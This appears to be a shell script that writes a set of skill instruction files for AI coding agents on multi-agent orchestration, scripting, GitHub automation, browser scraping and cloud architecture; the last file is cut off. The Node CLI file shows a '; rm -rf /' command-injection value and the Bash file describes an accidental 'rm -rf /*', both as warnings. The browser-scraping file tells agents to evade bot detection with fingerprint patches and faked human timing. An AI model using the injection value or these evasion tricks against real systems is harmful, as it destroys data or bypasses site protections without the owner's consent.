cat << 'EOF' > skills/agents/multi-agent/supervisor-worker-orchestration/SKILL.md
---
name: "supervisor-worker-orchestration"
description: "Architecting resilient multi-agent systems using a centralized Supervisor pattern, specialized Worker agents, inter-agent message buses, and consensus aggregation."
category: "agents"
subcategory: "multi-agent"
language: "python"
framework: "none"
technology: "multi-agent"
difficulty: "advanced"
tags: ["agents", "multi-agent", "supervisor-worker", "hierarchical", "consensus", "orchestration"]
---

# Multi-Agent Systems with Supervisor-Worker Hierarchies

## Purpose
Instruct AI agents to author scalable multi-agent systems where a Supervisor agent delegates specialized subtasks to domain-expert Workers, reviews outputs, and synthesizes results.

## When to Use
Use when building complex end-to-end applications requiring diverse specializations: research, software architecture, security review, coding, and technical writing.

## Inputs / Context
Overall project goal, worker agent personas (Coder, Reviewer, Tester, Researcher), supervisor routing logic, and shared state memory.

## Instructions
1. Structure the Supervisor-Worker Hierarchy:
   - Supervisor Agent: Acts as the orchestrator. Analyzes the global goal, decomposes it into tasks, routes tasks to appropriate Worker agents, inspects worker outputs for quality, and decides when the mission is accomplished.
   - Specialized Worker Agents: Focused, domain-specific agents with narrow toolsets (e.g., `ResearchAgent` has web search tools; `CodingAgent` has filesystem and bash tools; `SecurityAgent` has static analysis tools).
2. Maintain Centralized State via Shared Blackboard:
   - Workers do not message each other in an unconstrained, chaotic peer-to-peer web (which causes infinite conversational ping-pong).
   - All communication flows through the Supervisor and a shared state Blackboard (`SharedContext`).
3. Define Structured Worker Handoff Contracts:
   - Supervisor invokes workers with explicit task prompts and expected schema outputs.
   - Workers return structured status objects: `{"status": "completed" | "needs_clarification" | "failed", "artifacts": [...], "notes": "..."}`.
4. Implement Consensus and Verification Gates:
   - Before accepting a feature, the Supervisor routes the `CodingAgent`'s artifact to the `TesterAgent` and `SecurityAgent` for independent verification.
   - If any reviewer rejects the artifact, the Supervisor routes the actionable feedback back to the `CodingAgent`.
5. Enforce Hard Delegation Depth and Iteration Limits:
   - Cap maximum total agent interactions (e.g., max 15 handoffs) to prevent infinite loops.

## Constraints / Rules
- Never allow unconstrained peer-to-peer agent chat loops without a supervisory coordinator.
- Do not equip all worker agents with universal access to all tools; enforce role-specific tool isolation.
- Avoid deploying multi-agent systems where a single agent could achieve the goal with less complexity and cost.

## Workflow
1. Define worker agent personas with isolated toolsets.
2. Implement Supervisor evaluation and routing loop.
3. Supervisor dispatches task to primary worker.
4. Output is routed to reviewer/tester worker for verification.
5. Supervisor aggregates approved artifacts into final delivery.

## Expected Output
Multi-agent orchestration framework in Python with Supervisor routing, specialized worker personas, verification gates, and iteration limits.

## Validation Checklist
- [ ] Is communication orchestrated through a centralized Supervisor?
- [ ] Do worker agents possess specialized, isolated toolsets?
- [ ] Are artifacts verified by reviewer/tester agents before approval?
- [ ] Is a hard cap enforced on total multi-agent handoffs?
- [ ] Is shared state managed via a centralized, typed context blackboard?

## Common Mistakes & Antipatterns
- Creating 4 autonomous agents in an open group chat, watching them congratulate each other in an infinite conversational loop without writing any code.
- Giving the `DocumentationAgent` access to filesystem deletion tools, violating least-privilege tool isolation.
- Making the multi-agent hierarchy 5 levels deep, introducing crippling latency and exponential API costs.

## Concrete Real-World Example
Scenario: An enterprise feature request requires researching an API specification, writing the implementation code, and running security vulnerability checks.
Prompt: Build a multi-agent system with a Supervisor, Researcher, Coder, and Security Reviewer.
Application: The AI creates a `SupervisorAgent` that dispatches research to `ResearcherAgent`, passes the research brief to `CoderAgent`, routes the resulting code to `SecurityAgent` for OWASP checks, returns fixes to the coder if vulnerabilities are found, and approves final deployment.
EOF

cat << 'EOF' > skills/automation/python/idempotent-script-automation/SKILL.md
---
name: "idempotent-script-automation"
description: "Writing robust, idempotent Python automation scripts utilizing argparse CLI interfaces, file locks, atomic write operations, and graceful retry handlers."
category: "automation"
subcategory: "python"
language: "python"
framework: "none"
technology: "python-automation"
difficulty: "intermediate"
tags: ["automation", "python", "idempotency", "atomic-writes", "cli", "batch-processing"]
---

# Idempotent Python Script Automation and Batch Processing

## Purpose
Instruct AI agents to author production-grade Python automation scripts that can be safely re-run repeatedly without creating duplicate data or corrupting state.

## When to Use
Use when writing cron jobs, data migration scripts, filesystem cleanup utilities, bulk API synchronizers, or batch ETL jobs.

## Inputs / Context
Input data sources, target destinations, batch sizes, retry parameters, and logging requirements.

## Instructions
1. Enforce Idempotency Across All Actions:
   - Check Before Action: Verify whether an operation has already been performed before executing (e.g., check if a record or file already exists with identical hash).
   - Running the script 5 times consecutively must produce the exact same system state as running it once.
2. Atomic File Writes:
   - Never write directly to a destination file in place: a crash mid-write leaves a corrupted, half-written file.
   - Write to a temporary file in the same directory (`tempfile.NamedTemporaryFile(dir=..., delete=False)`), flush and sync to disk (`os.fsync`), and perform an atomic rename (`os.replace`) to the final destination.
3. Prevent Concurrent Overlap with File Locks:
   - Use `fcntl.flock` (Linux/macOS) or a lockfile mechanism to prevent multiple instances of the script from executing simultaneously if a previous run is still in progress.
4. Build Professional CLI Interfaces with `argparse`:
   - Support `--dry-run` to simulate actions and log planned changes without executing mutations.
   - Support `--verbose` / `--quiet` logging flags and configurable batch sizes (`--batch-size 100`).
5. Process in Bounded Batches with Checkpointing:
   - Process large collections in chunks; persist a progress state file or database watermark so the script can resume from the last successful item after an interruption.
6. Structured Logging and Exit Codes:
   - Use Python's `logging` module with timestamps and log levels (avoid raw `print`).
   - Return standard exit codes: `0` for success, non-zero for specific error conditions.

## Constraints / Rules
- Never write non-atomic file modifications in batch scripts.
- Never write scripts without a `--dry-run` flag for destructive mutations.
- Do not let batch scripts run indefinitely without progress checkpointing.

## Workflow
1. Parse CLI arguments including `--dry-run` and `--batch-size`.
2. Acquire process file lock to prevent overlapping runs.
3. Read watermark checkpoint from previous run.
4. Process items in batches with atomic updates and error handling.
5. Save updated watermark checkpoint and release lock on exit.

## Expected Output
Production Python automation script featuring CLI argument parsing, process locking, atomic file operations, dry-run simulation, and checkpoint resumption.

## Validation Checklist
- [ ] Is the script idempotent (safe to run repeatedly)?
- [ ] Is `--dry-run` implemented for safe previewing?
- [ ] Are file writes atomic via temp files and `os.replace`?
- [ ] Is process concurrency prevented using file locks?
- [ ] Are errors logged with structured formatting and standard exit codes?

## Common Mistakes & Antipatterns
- Overwriting a 500MB production database dump in-place; the server runs out of disk space halfway through, destroying both the old and new files.
- Running a cron job every 5 minutes that takes 8 minutes to run, spawning dozens of overlapping processes that exhaust server RAM.
- Using `print()` statements instead of configurable `logging`, making it impossible to redirect logs to syslog or parse in Datadog.

## Concrete Real-World Example
Scenario: A daily customer sync script creates duplicate records in Salesforce whenever the network times out and the script is re-run manually.
Prompt: Make this customer sync automation script idempotent and resilient to partial failures.
Application: The AI adds an `external_id` lookup before upserting records, stores a local `sync_checkpoint.json` watermark, acquires an exclusive `fcntl.flock` lock, implements a `--dry-run` flag, and uses exponential backoff retries, making re-runs 100% safe and duplicate-free.
EOF

cat << 'EOF' > skills/automation/javascript/node-automation-scripts/SKILL.md
---
name: "node-automation-scripts"
description: "Building command-line automation scripts in Node.js using Commander.js, execa for subprocess execution, Ora spinners, Chalk formatting, and signal handling."
category: "automation"
subcategory: "javascript"
language: "javascript"
framework: "none"
technology: "nodejs-cli"
difficulty: "intermediate"
tags: ["automation", "javascript", "nodejs", "cli", "commander", "subprocess", "tooling"]
---

# Node.js Automation Scripting, CLI Tooling, and Process Execution

## Purpose
Instruct AI agents to author polished, robust command-line automation scripts and developer tools in Node.js with interactive feedback and safe subprocess management.

## When to Use
Use when creating developer CLI tools, code generators, repository setup scripts, build hooks, or cross-platform automation utilities.

## Inputs / Context
CLI commands, options, subprocess execution requirements, user prompts, and terminal output specifications.

## Instructions
1. Structure CLI Applications with Commander.js:
   - Define clear commands, descriptions, arguments, and options with short/long flags (`-b, --branch <name>`).
   - Implement automatic `--help` generation and version flags (`-V, --version`).
2. Robust Subprocess Execution with `execa`:
   - Replace brittle `child_process.exec()` with `execa` or `child_process.spawn()` with arguments arrays (`['git', 'commit', '-m', message]`).
   - Never pass concatenated shell strings to prevent command injection vulnerabilities.
   - Stream subprocess output to stdout/stderr in real time for long-running commands.
3. Interactive Terminal UX:
   - Provide visual progress spinners (Ora) during asynchronous operations; stop and mark with green checks or red crosses upon completion.
   - Color-code terminal output with Chalk: blue for info, green for success, yellow for warnings, red for errors.
   - Support interactive prompts using `@inquirer/prompts` for missing required options.
4. Cross-Platform Path Handling:
   - Always use `path.join()` or `path.resolve()`; never concatenate path strings with `/` or `\`, ensuring full compatibility across Windows, macOS, and Linux.
5. Graceful Interruption Handling:
   - Trap `SIGINT` (Ctrl+C) and `SIGTERM`: restore terminal cursor visibility, terminate spawned child processes, clean up scratch files, and exit with code 130.

## Constraints / Rules
- Never use `child_process.exec(commandString)` with untrusted parameters.
- Never hardcode POSIX-only path separators (`/`) in filesystem operations.
- Avoid leaving terminal cursors hidden if an uncaught exception occurs during a spinner animation.

## Workflow
1. Define CLI program and commands using Commander.
2. Add argument validation and interactive prompt fallbacks.
3. Execute external tools via safe subprocess execution.
4. Render progress feedback with spinners and color-coded status.
5. Attach cleanup hooks for SIGINT and uncaught errors.

## Expected Output
Production Node.js CLI script featuring robust command parsing, safe subprocess execution, cross-platform path safety, and polished terminal feedback.

## Validation Checklist
- [ ] Are commands parsed using Commander with help documentation?
- [ ] Are subprocesses spawned with argument arrays (no shell injection)?
- [ ] Are paths cross-platform using `path.join`?
- [ ] Are SIGINT signals handled cleanly to restore the terminal?
- [ ] Does the script return standard exit codes (0 for success)?

## Common Mistakes & Antipatterns
- Concatenating user input into shell commands: `exec('git checkout ' + branch)`, allowing command injection if branch contains `; rm -rf /`.
- Using `console.log('\033[31mError\033[0m')` directly instead of a cross-platform styling library, producing unreadable escape characters on Windows terminals.
- Leaving a spinner spinning forever when an async function rejects an unhandled error.

## Concrete Real-World Example
Scenario: An internal developer scaffolding tool frequently breaks on Windows developer laptops due to path separator bugs and hangs when child git commands fail.
Prompt: Refactor this project scaffolding script in Node.js to be cross-platform, safe, and interactive.
Application: The AI builds a CLI using Commander, replaces shell strings with `execa`, uses `path.resolve` for cross-platform file paths, wraps steps in Ora spinners with Chalk formatting, and traps `SIGINT` to clean up incomplete folders.
EOF

cat << 'EOF' > skills/automation/shell/posix-compliant-cli-tooling/SKILL.md
---
name: "posix-compliant-cli-tooling"
description: "Authoring rock-solid, defensive Bash and POSIX-compliant shell scripts with set -euo pipefail, safe variable expansion, trap cleanup, and portable utilities."
category: "automation"
subcategory: "shell"
language: "bash"
framework: "none"
technology: "bash-posix"
difficulty: "intermediate"
tags: ["automation", "shell", "bash", "posix", "defensive-scripting", "trap", "devops"]
---

# POSIX-Compliant Shell Scripting and Defensive Bash Architecture

## Purpose
Equip AI agents with the discipline required to author bulletproof, portable shell scripts that handle errors strictly, clean up resources on exit, and avoid common shell pitfalls.

## When to Use
Use when writing deployment scripts, CI runner steps, system maintenance scripts, backup hooks, or container entrypoints in Bash/sh.

## Inputs / Context
Automation goals, target OS environments (Linux, macOS, Alpine ash), arguments, and cleanup tasks.

## Instructions
1. Enforce Strict Defensive Mode at the Top of Every Script:
   - `set -euo pipefail`
   - `-e`: Exit immediately if any command exits with a non-zero status.
   - `-u`: Treat unset variables and parameters as an error and exit immediately.
   - `-o pipefail`: Return the exit status of the first command in a pipeline that failed (instead of masking failures with the last command).
2. Quote All Variable Expansions:
   - Always wrap variable expansions in double quotes: `"$my_var"`, `"$1"`, `"$file"`.
   - Unquoted expansions undergo word splitting and globbing, causing catastrophic bugs when paths contain spaces.
3. Guaranteed Resource Cleanup with `trap`:
   - Always use `trap cleanup EXIT INT TERM` to clean up temporary directories and locks.
   - Define a `cleanup()` function that deletes scratch files and terminates background child processes:
     `cleanup() { rm -rf "$TEMP_DIR"; }`
4. Safe Temporary Directory Creation:
   - Use `TEMP_DIR="$(mktemp -d)"` rather than hardcoding `/tmp/myscript`.
5. Self-Locating Script Directory:
   - Reliably determine the script's physical location regardless of current working directory:
     `SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"`
6. Verify Tool Dependencies Upfront:
   - Check required CLI tools exist before running:
     `command -v jq >/dev/null 2>&1 || { echo >&2 "Error: jq is required but not installed."; exit 1; }`
7. Portable Syntax vs Bashisms:
   - Use `#!/usr/bin/env bash` when utilizing Bash features (`[[`, arrays, `${var//search/replace}`).
   - If targeting pure POSIX `/bin/sh` (Alpine Linux), restrict syntax to standard `[` test brackets and avoid bash-only constructs.

## Constraints / Rules
- Never write production shell scripts without `set -euo pipefail`.
- Never use unquoted variable expansions (`rm -rf $DIR` can delete root `/` if `$DIR` is empty or unset).
- Do not use absolute paths for system binaries (`/usr/bin/grep`); rely on `PATH` resolution.

## Workflow
1. Declare shebang and strict mode flags (`set -euo pipefail`).
2. Identify script directory and create temp dir.
3. Attach `trap cleanup EXIT INT TERM` handler.
4. Verify required binary dependencies.
5. Parse arguments with `getopts` or `while` loop.
6. Execute business logic with quoted variables.

## Expected Output
Robust, defensive Bash script featuring strict error modes, trap cleanup, quoted variable safety, and dependency verification.

## Validation Checklist
- [ ] Is `set -euo pipefail` present at the top?
- [ ] Are all variable expansions wrapped in double quotes?
- [ ] Is temporary file cleanup guaranteed via `trap ... EXIT`?
- [ ] Are required CLI dependencies validated using `command -v`?
- [ ] Does shellcheck report zero warnings on the script?

## Common Mistakes & Antipatterns
- Writing `rm -rf "$TARGET_DIR/*"`, but `$TARGET_DIR` is unset, and because `-u` was not set, the shell executes `rm -rf /*`, destroying the operating system.
- Failing a command inside a pipe (`curl https://broken.url | tar -xz`), but the script continues blindly because `pipefail` was omitted.
- Failing to clean up temporary directories created in `/tmp`, eventually filling the host disk inode table.

## Concrete Real-World Example
Scenario: A database backup script fails silently in production because a `pg_dump` pipe command failed, creating an empty backup archive that went unnoticed.
Prompt: Author a bulletproof, defensive Bash script for creating and uploading compressed database backups.
Application: The AI structures the script with `set -euo pipefail`, binds `trap cleanup EXIT INT TERM` to delete temporary dump files, checks for `pg_dump` and `aws` CLI tools, quotes all paths, checks pipe exit statuses, and sends Slack alerts on failure.
EOF

cat << 'EOF' > skills/automation/github/gh-cli-and-api-automation/SKILL.md
---
name: "gh-cli-and-api-automation"
description: "Automating GitHub administration, issue triaging, release generation, and PR workflows using the official GitHub CLI (gh) and GraphQL API."
category: "automation"
subcategory: "github"
language: "bash"
framework: "github-cli"
technology: "github-api"
difficulty: "intermediate"
tags: ["automation", "github", "gh-cli", "graphql", "api", "release-automation", "devops"]
---

# GitHub CLI (gh) Automation, REST/GraphQL API Scripting

## Purpose
Instruct AI agents to script and automate complex GitHub repository management tasks, PR reviews, release publishing, and label synchronization using the `gh` CLI.

## When to Use
Use when automating GitHub workflows, orchestrating release cutovers, batch updating repository settings, or migrating issues across repositories.

## Inputs / Context
Repository target (`owner/repo`), GitHub authentication token, release notes/tags, and API payload specifications.

## Instructions
1. Leverage Official GitHub CLI (`gh`):
   - Use `gh` CLI commands rather than writing raw `curl` calls with manual Authorization headers; `gh` handles authentication, paging, and error formatting automatically.
2. Query Data Efficiently with JSON and jq Integration:
   - Use `--json` flag to specify exact fields needed: `gh pr list --json number,title,author,headRefName`.
   - Use `--jq` flag to filter and format JSON output directly on the CLI without external pipes:
     `gh issue list --label "bug" --json number --jq '.[].number'`
3. Execute Complex Queries via GraphQL:
   - Use `gh api graphql` for bulk operations, nested issue project card queries, or operations not exposed via standard REST commands.
   - Use `-F` flags to pass parameterized variables safely into GraphQL query strings.
4. Automate Release Creation with Artifacts and Generated Notes:
   - Use `gh release create <tag> [files...] --generate-notes --title "Release vX.Y.Z"` to automatically generate changelogs from merged PRs and attach compiled binaries in a single step.
5. Batch Process Across Repositories:
   - Iterate through repository lists using `gh repo list <org> --json nameWithOwner --jq '.[].nameWithOwner'`.
   - Apply changes idempotently (e.g., verifying a label exists before attempting creation to avoid conflict errors).
6. Non-Interactive CI Mode:
   - Set `export GH_NO_PROMPT=1` or pass explicit confirmation flags (`--yes`, `--confirm`) to prevent scripts from hanging waiting for interactive user terminal prompts in automated CI environments.

## Constraints / Rules
- Never write scripts that hang awaiting interactive input in CI (`GH_NO_PROMPT=1` is mandatory).
- Avoid parsing human-readable table outputs; always request structured output via `--json`.
- Do not expose `GITHUB_TOKEN` values in script logs.

## Workflow
1. Set `GH_NO_PROMPT=1`.
2. Verify authentication status: `gh auth status`.
3. Query resources using `gh ... --json ... --jq ...`.
4. Process updates or create releases with attached artifacts.
5. Verify resulting GitHub state.

## Expected Output
Clean Bash automation script leveraging GitHub CLI `gh` with structured JSON filtering, release creation, and zero interactive prompts.

## Validation Checklist
- [ ] Is `GH_NO_PROMPT=1` set for headless execution?
- [ ] Are commands querying structured data with `--json` and `--jq`?
- [ ] Are releases created with `--generate-notes` and attached artifacts?
- [ ] Are GraphQL queries parameterized safely with `-F` flags?
- [ ] Is error handling verified for missing or unauthorized repos?

## Common Mistakes & Antipatterns
- Parsing raw column output from `gh pr list` using `awk` or `cut`, which breaks whenever a PR title contains spaces or tabs (always use `--json`!).
- Running `gh release create` in a GitHub Actions runner without `--title` or notes, causing the CLI to attempt to open an interactive `vim` editor and hanging the build.
- Forgetting that `gh api` paginates results, missing data after the first 30 items without `--paginate`.

## Concrete Real-World Example
Scenario: A release manager manually tags releases, drafts changelogs, and uploads 4 binary assets across 12 microservice repositories every Friday.
Prompt: Author a script using GitHub CLI to automate tagging, changelog generation, and asset uploads for a repository.
Application: The AI creates a Bash script accepting version and binary paths, verifies clean git state, creates a Git tag, runs `gh release create "$TAG" ./dist/* --title "Release $TAG" --generate-notes`, and notifies the team, cutting release time from 40 minutes to 30 seconds.
EOF

cat << 'EOF' > skills/automation/browser/headless-browser-automation/SKILL.md
---
name: "headless-browser-automation"
description: "Building resilient headless browser automation scripts utilizing stealth plugins, resource blocking, robust waiting strategies, and structured DOM extraction."
category: "automation"
subcategory: "browser"
language: "typescript"
framework: "none"
technology: "headless-browser"
difficulty: "advanced"
tags: ["automation", "browser", "headless", "scraping", "puppeteer", "playwright", "stealth"]
---

# Headless Browser Automation and Web Scraping with Puppeteer/Playwright

## Purpose
Instruct AI agents to author reliable headless browser automation scripts that bypass bot-detection heuristics, extract structured data, and optimize memory consumption.

## When to Use
Use when scraping dynamic JavaScript-heavy websites, automating interactions on websites without public APIs, generating PDF reports, or capturing screenshots.

## Inputs / Context
Target website URL, interaction steps (login, navigation, search), data selectors, and output format (JSON/CSV).

## Instructions
1. Optimize Memory and Speed by Blocking Non-Essential Resources:
   - Intercept network requests and abort requests for images, fonts, stylesheets, and tracking media if only scraping data:
     `page.route('**/*.{png,jpg,jpeg,svg,woff,woff2}', route => route.abort());`
   - Reduces network bandwidth by 80% and accelerates page execution.
2. Robust Waiting Strategies:
   - Never use arbitrary sleep timers (`waitForTimeout`).
   - Wait for explicit selectors or network idle state:
     `await page.waitForSelector('.result-item', { state: 'visible' });`
   - Wait for API responses directly when actions trigger dynamic AJAX calls:
     `await Promise.all([page.waitForResponse(resp => resp.url().includes('/api/items')), page.click('button#load')]);`
3. Evade Bot Detection Heuristics:
   - Configure realistic User-Agent headers, viewport dimensions, and locale settings.
   - Use Playwright/Puppeteer stealth configurations to patch `navigator.webdriver = true` and WebGL fingerprint signatures.
   - Introduce subtle randomized delays between keystrokes and clicks to mimic human cadence.
4. Clean Resource Disposal:
   - Always run browser automation inside `try/finally` blocks ensuring `browser.close()` is called even if an error or timeout occurs.
   - Use browser contexts (`browser.newContext()`) for multi-session isolation rather than launching multiple heavy browser instances.
5. Extract Clean Structured Data:
   - Extract data within the browser execution context using `page.$$eval()` to minimize serialization overhead across the CDP bridge.

## Constraints / Rules
- Never write headless automation scripts that leave orphaned Chromium browser processes running in background memory.
- Avoid downloading full media assets when only text data is required.
- Do not use fixed sleep delays (`sleep(5000)`) for page loading.

## Workflow
1. Launch headless browser with stealth flags and custom user-agent.
2. Create isolated browser context and configure request interception to block images/fonts.
3. Navigate to target URL with explicit wait condition.
4. Execute user interactions (filling forms, clicking search).
5. Extract structured data via `page.$$eval`.
6. Ensure `browser.close()` runs in `finally` block.

## Expected Output
Resilient TypeScript headless browser script featuring resource blocking, auto-waiting, stealth configuration, and guaranteed process cleanup.

## Validation Checklist
- [ ] Are browser instances guaranteed to close in a `finally` block?
- [ ] Are non-essential media resources blocked to optimize memory and speed?
- [ ] Are arbitrary sleep timers replaced with explicit selector/network waits?
- [ ] Are user-agent and viewport settings configured realistically?
- [ ] Is data extracted cleanly using `$$eval` without bridge bottlenecks?

## Common Mistakes & Antipatterns
- An uncaught exception occurs during scraping, leaving 20 headless Chromium instances running in the background, consuming 8GB of RAM and crashing the server.
- Relying on `page.waitForTimeout(10000)` which still fails when network latency fluctuates.
- Scraping without custom User-Agent headers, getting blocked immediately by Cloudflare or Akamai bot protection on the first request.

## Concrete Real-World Example
Scenario: A price monitoring script crashes the server with high memory usage and gets blocked with HTTP 403 on target e-commerce sites.
Prompt: Build a resilient headless browser scraper in Playwright for product price extraction with stealth and resource blocking.
Application: The AI creates an automated scraper that blocks image/font downloads via `page.route`, applies stealth user-agent and navigator patches, waits for the price container selector explicitly, extracts price and availability into a JSON record, and closes the browser context cleanly in `finally`.
EOF

cat << 'EOF' > skills/cloud/aws/serverless-event-driven-architecture/SKILL.md
---
name: "serverless-event-driven-architecture"
description: "Architecting scalable, resilient event-driven cloud systems on AWS utilizing Lambda, SQS Dead-Letter Queues (DLQs), EventBridge buses, and IAM least-privilege policies."
category: "cloud"
subcategory: "aws"
language: "python"
framework: "aws-sam"
technology: "aws-serverless"
difficulty: "advanced"
tags: ["cloud", "aws", "serverless", "lambda", "sqs", "eventbridge", "dlq", "iam"]
---

# AWS Serverless Event-Driven Architecture (Lambda, SQS, EventBridge)

## Purpose
Instruct AI agents to design decoupled, fault-tolerant serverless architectures on AWS that handle traffic spikes, guarantee message durability, and enforce strict IAM permissions.

## When to Use
Use when designing cloud-native microservices, asynchronous task queues, webhooks processors, or event-driven integration pipelines on AWS.

## Inputs / Context
Event schemas, producer services, consumer microservices, throughput targets, and error retention policies.

## Instructions
1. Event Routing with Amazon EventBridge:
   - Use an EventBridge Custom Event Bus to decouple event producers from consumers; avoid direct point-to-point invocations between Lambdas.
   - Define strict Event Schemas and filter rules: consumers subscribe only to specific event details (`source`, `detail-type`).
2. Buffer and Regulate Traffic with SQS Queues:
   - Buffer high-volume events between EventBridge and consumer Lambdas using Amazon SQS to prevent downstream database saturation.
   - Configure SQS Visibility Timeout to at least 6x the downstream Lambda timeout.
   - Configure Lambda Event Source Mapping batching (`BatchSize: 10`, `MaximumBatchingWindowInSeconds: 5`) and enable `ReportBatchItemFailures` so that only failed messages in a batch are retried, not the entire batch.
3. Guarantee Message Durability with Dead-Letter Queues (DLQs):
   - Attach an SQS Dead-Letter Queue (DLQ) with `maxReceiveCount: 3` to every primary queue and Lambda asynchronous invocation.
   - Configure CloudWatch Alarms on `ApproximateNumberOfMessagesVisible > 0` in the DLQ to alert on poison-pill messages.
4. Optimize Lambda Cold Starts and Concurrency:
   - Right-size Lambda memory allocation (which proportionally scales CPU allocation).
   - Set Reserved Concurrency to prevent a rogue function from consuming the entire account-level concurrency quota (default 1,000).
5. Enforce Least-Privilege IAM Roles:
   - Scoped IAM execution roles per Lambda function: grant access only to specific resource ARNs (`Resource: "arn:aws:sqs:..."`) and specific API actions (`Action: ["sqs:ReceiveMessage", "sqs:DeleteMessage"]`). Never use wildcard `Resource: "*"`.
   - Store secrets in AWS Secrets Manager or Systems Manager Parameter Store and retrieve them during initialization (outside the handler).

## Constraints / Rules
- Never write IAM policies with `Resource: "*"` or `Action: "*"` in production.
- Never invoke worker Lambdas synchronously from web request handlers when asynchronous queueing is appropriate.
- Avoid deploying serverless functions without a configured Dead-Letter Queue.

## Workflow
1. Define event schema and publish to EventBridge custom bus.
2. Create target SQS queue with attached DLQ.
3. Author Lambda consumer handler using `ReportBatchItemFailures`.
4. Define IAM policy granting minimal permissions on SQS ARN.
5. Deploy via AWS SAM / CDK and verify with test events.

## Expected Output
Infrastructure-as-Code (SAM/CloudFormation or CDK) and Python Lambda handler code featuring EventBridge routing, SQS buffering, DLQs, and least-privilege IAM roles.

## Validation Checklist
- [ ] Is EventBridge used to decouple event producers and consumers?
- [ ] Is an SQS DLQ attached with CloudWatch alarm monitoring?
- [ ] Is `ReportBatchItemFailures` enabled on Lambda batch processing?
- [ ] Are IAM policies restricted to explicit resource ARNs?
- [ ] Are secrets loaded outside the Lambda invocation handler?

## Common Mistakes & Antipatterns
- Processing SQS batches without `ReportBatchItemFailures`: if message 9 of 10 fails, the entire batch of 10 messages is reprocessed, causing duplicate processing of messages 1-8.
- Setting SQS visibility timeout shorter than Lambda function timeout, causing SQS to redeliver the message to another worker while the first worker is still executing.
- Granting `AdministratorAccess` to a Lambda execution role for development speed and deploying it to production.

## Concrete Real-World Example
Scenario: An order processing Lambda crashes on a single malformed JSON message, causing the entire batch of 10 valid orders to be reprocessed in an infinite loop, charging customer credit cards repeatedly.
Prompt: Refactor this AWS order processing pipeline to handle partial batch failures and isolate poison pills using SQS and DLQs.
Application: The AI configures SQS with a Dead-Letter Queue (`maxReceiveCount: 3`), enables `ReportBatchItemFailures` in the SAM template, and updates the Python Lambda handler to catch individual item exceptions and return `{"batchItemFailures": [{"itemIdentifier": msg_id}]}`, quarantining the bad record while successfully committing the valid 9 orders.
EOF

cat << 'EOF' > skills/cloud/azure/managed-identity-and-cloud-native/SKILL.md
---
name: "managed-identity-and-cloud-native"
description: "Architecting secure Azure cloud-native services utilizing User-Assigned Managed Identities, Azure Key Vault secret retrieval, and Azure App Service / Container Apps."
category: "cloud"
subcategory: "azure"
language: "bicep"
framework: "azure"
technology: "azure-cloud"
difficulty: "advanced"
tags: ["cloud", "azure", "managed-identity", "key-vault", "bicep", "security", "zero-trust"]
---

# Azure Cloud-Native Architecture with Managed Identities and Key Vault

## Purpose
Instruct AI agents to eliminate static credentials and connection strings in Azure deployments by enforcing Managed Identities, RBAC role assignments, and Azure Key Vault references.

## When to Use
Use when deploying web apps on Azure App Service, Azure Container Apps, or Azure Functions accessing Azure SQL, Cosmos DB, or Blob Storage.

## Inputs / Context
Azure services to connect, resource group topology, RBAC roles required, and Infrastructure-as-Code definitions (Bicep/ARM).

## Instructions
1. Eliminate Hardcoded Credentials using Managed Identities:
   - Enable User-Assigned Managed Identity on compute resources (App Service, Container Apps, VMs).
   - Use Azure AD (Entra ID) token-based authentication to connect to downstream services (Azure SQL, Cosmos DB, Azure Storage) rather than storing database usernames/passwords in connection strings.
2. Least-Privilege Azure RBAC Role Assignments:
   - Assign built-in Azure RBAC roles directly to the Managed Identity:
     * Azure Storage: `Storage Blob Data Contributor` (instead of using raw Storage Account Access Keys).
     * Service Bus: `Azure Service Bus Data Receiver` / `Sender`.
     * Key Vault: `Key Vault Secrets User`.
3. Secret Management via Azure Key Vault:
   - For third-party API keys that do not support Managed Identity (e.g., Stripe, SendGrid), store them in Azure Key Vault.
   - Configure App Service to reference secrets using Key Vault References: `@Microsoft.KeyVault(VaultName=myvault;SecretName=mysecret)`. The Azure platform resolves the secret automatically at runtime without custom code.
4. Network Isolation and Private Endpoints:
   - Disable public network access on Azure SQL and Storage Accounts.
   - Connect compute services to storage services using Azure Virtual Network (VNet) Integration and Private Endpoints with Private DNS Zones.

## Constraints / Rules
- Never commit Azure Storage Account Connection Strings or SQL credentials to repository code or configuration files.
- Never assign broad `Contributor` or `Owner` roles to Managed Identities; use granular Data Plane roles.
- Do not expose Azure Key Vault publicly without VNet / firewall restrictions.

## Workflow
1. Create User-Assigned Managed Identity via Bicep.
2. Assign RBAC roles (`Key Vault Secrets User`, `Storage Blob Data Contributor`) to identity.
3. Configure App Service / Container App with the Managed Identity.
4. Author Bicep templates provisioning VNet and Private Endpoints.
5. Connect in application code using `DefaultAzureCredential` from `@azure/identity`.

## Expected Output
Production Azure Bicep template and application code connecting to Azure resources securely using `DefaultAzureCredential` and Managed Identities with zero static secrets.

## Validation Checklist
- [ ] Are static credentials eliminated in favor of Managed Identity?
- [ ] Are RBAC role assignments granted with least-privilege data plane scopes?
- [ ] Are third-party secrets stored in Azure Key Vault?
- [ ] Is application code utilizing `DefaultAzureCredential`?
- [ ] Is public network access disabled on database and storage resources?

## Common Mistakes & Antipatterns
- Hardcoding `AccountKey=...` in Azure Storage connection strings in `appsettings.json`, allowing anyone with repo access to download all customer files.
- Granting `Key Vault Administrator` role to an application identity instead of `Key Vault Secrets User`.
- Storing client secrets in code to authenticate against Azure AD instead of leveraging Azure Managed Identity.

## Concrete Real-World Example
Scenario: An Azure App Service connects to Azure Blob Storage using a shared access key stored in plain text in an environment variable.
Prompt: Refactor this Azure deployment to use Managed Identity and Bicep with zero stored keys.
Application: The AI authors a Bicep template creating a User-Assigned Managed Identity, assigns the `Storage Blob Data Contributor` role on the storage account to that identity, binds it to the App Service, and updates the application code to connect using `BlobServiceClient(url, new DefaultAzureCredential())`.
EOF

cat << 'EOF' > skills/cloud/google-cloud/cloud-run-containerized-microservices/SKILL.md
---
name: "cloud-run-containerized-microservices"
description: "Deploying scalable, secure containerized microservices on Google Cloud Run utilizing minimum instances, Cloud SQL connectors, Secret Manager, and Workload Identity."
category: "cloud"
subcategory: "google-cloud"
language: "yaml"
framework: "gcp"
technology: "google-cloud-run"
difficulty: "intermediate"
tags: ["cloud", "google-cloud", "gcp", "cloud-run", "containers", "secret-manager", "cloud-sql"]
---

# Google Cloud Run Containerized Architecture and IAM Workload Identity

## Purpose
Provide AI agents with concrete blueprints for architecting high-performance containerized microservices on Google Cloud Run with instant scaling, zero cold-start latency, and secure IAM service accounts.

## When to Use
Use when deploying web applications, REST APIs, or background workers on Google Cloud Platform using serverless containers.

## Inputs / Context
